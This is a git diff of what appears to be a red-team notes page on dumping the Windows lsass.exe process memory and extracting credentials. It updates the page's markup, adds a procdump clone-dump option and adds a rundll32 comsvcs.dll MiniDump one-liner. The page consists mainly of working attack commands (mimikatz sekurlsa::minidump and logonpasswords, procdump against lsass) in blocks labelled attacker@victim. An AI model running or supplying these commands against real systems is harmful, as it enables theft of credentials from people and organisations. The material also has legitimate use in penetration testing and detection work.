@@ -1,4 +1,4 @@
-# Dumping Lsass.exe to Disk and Extracting Credentials
+# Dumping Lsass.exe to Disk Without Mimikatz and Extracting Credentials
 
 ## Task Manager
 
@@ -10,14 +10,12 @@ Create a minidump of the lsass.exe using task manager \(must be running as admin
 
 Swtich mimikatz context to the minidump:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@mimikatz" %}
+{% code title="attacker@mimikatz" %}
 ```csharp
 sekurlsa::minidump C:\Users\ADMINI~1.OFF\AppData\Local\Temp\lsass.DMP
 sekurlsa::logonpasswords
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-12-19-54-15.png)
 
@@ -25,15 +23,30 @@ sekurlsa::logonpasswords
 
 Procdump from sysinternal's could also be used to dump the process:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+// or avoid reading lsass by dumping a cloned lsass process
+procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-12-20-11-28.png)
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-12-20-13-25.png)
+
+## comsvcs.dll
+
+Executing a native comsvcs.dll DLL found in Windows\system32 with rundll32:
+
+```text
+.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
+```
+
+![](../../.gitbook/assets/image%20%28246%29.png)
+
+## References
+
+{% embed url="https://t.co/s2VePo3ICo?amp=1" %}
 
